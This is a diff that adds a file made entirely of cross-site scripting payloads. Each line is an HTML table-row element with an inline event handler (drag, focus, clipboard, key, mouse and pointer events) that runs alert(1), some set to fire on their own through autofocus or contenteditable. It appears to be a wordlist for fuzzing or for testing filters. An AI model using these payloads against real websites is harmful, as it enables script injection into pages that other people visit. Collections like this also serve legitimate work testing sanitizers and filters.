@@ -1,0 +1,43 @@
+<tr draggable="true" ondrag="alert(1)">test</tr>
+<tr draggable="true" ondragend="alert(1)">test</tr>
+<tr draggable="true" ondragenter="alert(1)">test</tr>
+<tr draggable="true" ondragleave="alert(1)">test</tr>
+<tr draggable="true" ondragstart="alert(1)">test</tr>
+<tr id=x tabindex=1 onactivate=alert(1)></tr>
+<tr id=x tabindex=1 onbeforeactivate=alert(1)></tr>
+<tr id=x tabindex=1 onbeforedeactivate=alert(1)></tr><input autofocus>
+<tr id=x tabindex=1 ondeactivate=alert(1)></tr><input id=y autofocus>
+<tr id=x tabindex=1 onfocus=alert(1)></tr>
+<tr id=x tabindex=1 onfocusin=alert(1)></tr>
+<tr onafterscriptexecute=alert(1)><script>1</script>
+<tr onbeforecopy="alert(1)" contenteditable>test</tr>
+<tr onbeforecut="alert(1)" contenteditable>test</tr>
+<tr onbeforepaste="alert(1)" contenteditable>test</tr>
+<tr onbeforescriptexecute=alert(1)><script>1</script>
+<tr onblur=alert(1) tabindex=1 id=x></tr><input autofocus>
+<tr onclick="alert(1)">test</tr>
+<tr oncontextmenu="alert(1)">test</tr>
+<tr oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<tr oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<tr ondblclick="alert(1)" autofocus tabindex=1>test</tr>
+<tr onfocusout=alert(1) tabindex=1 id=x></tr><input autofocus>
+<tr onkeydown="alert(1)" contenteditable>test</tr>
+<tr onkeypress="alert(1)" contenteditable>test</tr>
+<tr onkeyup="alert(1)" contenteditable>test</tr>
+<tr onmousedown="alert(1)">test</tr>
+<tr onmouseenter="alert(1)">test</tr>
+<tr onmouseleave="alert(1)">test</tr>
+<tr onmousemove="alert(1)">test</tr>
+<tr onmouseout="alert(1)">test</tr>
+<tr onmouseover="alert(1)">test</tr>
+<tr onmouseup="alert(1)">test</tr>
+<tr onmousewheel=alert(1)>requires scrolling
+<tr onpaste="alert(1)" contenteditable>test</tr>
+<tr onpointerdown=alert(1)>XSS</tr>
+<tr onpointerenter=alert(1)>XSS</tr>
+<tr onpointerleave=alert(1)>XSS</tr>
+<tr onpointermove=alert(1)>XSS</tr>
+<tr onpointerout=alert(1)>XSS</tr>
+<tr onpointerover=alert(1)>XSS</tr>
+<tr onpointerrawupdate=alert(1)>XSS</tr>
+<tr onpointerup=alert(1)>XSS</tr>
